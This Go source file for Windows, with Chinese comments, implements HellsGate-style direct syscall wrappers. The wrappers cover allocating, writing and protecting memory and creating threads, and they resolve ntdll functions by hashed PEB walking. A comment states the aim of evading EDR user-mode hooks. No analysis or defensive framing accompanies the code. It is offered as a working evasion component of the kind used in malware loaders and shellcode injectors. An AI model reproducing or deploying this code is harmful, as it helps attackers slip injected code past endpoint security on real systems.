//go:build windows && amd64

package main

import (
	"unsafe"
)

// directSyscall 由 directsyscall_windows_amd64.s 提供（amd64 直接系统调用）。
//
//go:noescape
func directSyscall(ssn, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12 uintptr) uintptr

// ntSSN 从 ntdll 导出函数的 syscall 桩中提取系统服务号（HellsGate 风格）。
// 函数地址经 apihash（PEB 模块遍历 + 导出表 FNV-1a 哈希）解析，不调用
// GetProcAddress / LoadLibrary，避免被 EDR 用户态 hook 追踪动态解析。
// 返回 0 表示解析失败（调用方回退到 resolveAPI 调用）。
func ntSSN(api string) uintptr {
	addr := getAPI("ntdll.dll", api)
	if addr == 0 {
		return 0
	}
	// 桩签名校验：4C 8B D1 B8 = mov r10,rcx; mov eax,imm32
	b := (*[8]byte)(unsafe.Pointer(addr))
	if b[0] != 0x4C || b[1] != 0x8B || b[2] != 0xD1 || b[3] != 0xB8 {
		return 0
	}
	return uintptr(*(*uint32)(unsafe.Pointer(addr + 4)))
}

// 当前进程伪句柄（-1），32/64 位通吃。
const currentProcess = ^uintptr(0)

// ntAllocateVirtualMemory 直接系统调用版，SSN 解析失败时回退 apihash 调用。
// NTSTATUS NtAllocateVirtualMemory(ProcessHandle, *BaseAddress, ZeroBits, *RegionSize, AllocationType, Protect)
func ntAllocateVirtualMemory(process uintptr, baseAddr, regionSize *uintptr, allocType, protect uint32) uintptr {
	if ssn := ntSSN("NtAllocateVirtualMemory"); ssn != 0 {
		return directSyscall(ssn, process, uintptr(unsafe.Pointer(baseAddr)), 0, uintptr(unsafe.Pointer(regionSize)), uintptr(allocType), uintptr(protect), 0, 0, 0, 0, 0, 0)
	}
	r1, _, _ := resolveAPI("ntdll.dll", "NtAllocateVirtualMemory").Call(process, uintptr(unsafe.Pointer(baseAddr)), 0, uintptr(unsafe.Pointer(regionSize)), uintptr(allocType), uintptr(protect))
	return r1
}

// ntFreeVirtualMemory 直接系统调用版。
// NTSTATUS NtFreeVirtualMemory(ProcessHandle, *BaseAddress, *RegionSize, FreeType)
func ntFreeVirtualMemory(process uintptr, baseAddr, regionSize *uintptr, freeType uint32) uintptr {
	if ssn := ntSSN("NtFreeVirtualMemory"); ssn != 0 {
		return directSyscall(ssn, process, uintptr(unsafe.Pointer(baseAddr)), uintptr(unsafe.Pointer(regionSize)), uintptr(freeType), 0, 0, 0, 0, 0, 0, 0, 0)
	}
	r1, _, _ := resolveAPI("ntdll.dll", "NtFreeVirtualMemory").Call(process, uintptr(unsafe.Pointer(baseAddr)), uintptr(unsafe.Pointer(regionSize)), uintptr(freeType))
	return r1
}

// ntProtectVirtualMemory 直接系统调用版。
// NTSTATUS NtProtectVirtualMemory(ProcessHandle, *BaseAddress, *RegionSize, NewProtect, *OldProtect)
func ntProtectVirtualMemory(process uintptr, baseAddr, regionSize *uintptr, newProtect uint32, oldProtect *uint32) uintptr {
	if ssn := ntSSN("NtProtectVirtualMemory"); ssn != 0 {
		return directSyscall(ssn, process, uintptr(unsafe.Pointer(baseAddr)), uintptr(unsafe.Pointer(regionSize)), uintptr(newProtect), uintptr(unsafe.Pointer(oldProtect)), 0, 0, 0, 0, 0, 0, 0)
	}
	r1, _, _ := resolveAPI("ntdll.dll", "NtProtectVirtualMemory").Call(process, uintptr(unsafe.Pointer(baseAddr)), uintptr(unsafe.Pointer(regionSize)), uintptr(newProtect), uintptr(unsafe.Pointer(oldProtect)))
	return r1
}

// ntWriteVirtualMemory 直接系统调用版。
// NTSTATUS NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferSize, *BytesWritten)
func ntWriteVirtualMemory(process, baseAddr, buffer uintptr, size uintptr, bytesWritten *uintptr) uintptr {
	if ssn := ntSSN("NtWriteVirtualMemory"); ssn != 0 {
		return directSyscall(ssn, process, baseAddr, buffer, size, uintptr(unsafe.Pointer(bytesWritten)), 0, 0, 0, 0, 0, 0, 0)
	}
	r1, _, _ := resolveAPI("ntdll.dll", "NtWriteVirtualMemory").Call(process, baseAddr, buffer, size, uintptr(unsafe.Pointer(bytesWritten)))
	return r1
}

// ntCreateThreadEx 直接系统调用版（11 参数）。
// NTSTATUS NtCreateThreadEx(*ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
// StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList)
func ntCreateThreadEx(threadHandle *uintptr, desiredAccess, objAttr, process, startRoutine, argument, createFlags, zeroBits, stackSize, maxStackSize, attributeList uintptr) uintptr {
	if ssn := ntSSN("NtCreateThreadEx"); ssn != 0 {
		return directSyscall(ssn, uintptr(unsafe.Pointer(threadHandle)), desiredAccess, objAttr, process, startRoutine, argument, createFlags, zeroBits, stackSize, maxStackSize, attributeList, 0)
	}
	r1, _, _ := resolveAPI("ntdll.dll", "NtCreateThreadEx").Call(uintptr(unsafe.Pointer(threadHandle)), desiredAccess, objAttr, process, startRoutine, argument, createFlags, zeroBits, stackSize, maxStackSize, attributeList)
	return r1
}

// ntClose 直接系统调用版。
// NTSTATUS NtClose(Handle)
func ntClose(handle uintptr) uintptr {
	if ssn := ntSSN("NtClose"); ssn != 0 {
		return directSyscall(ssn, handle, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
	}
	r1, _, _ := resolveAPI("ntdll.dll", "NtClose").Call(handle)
	return r1
}
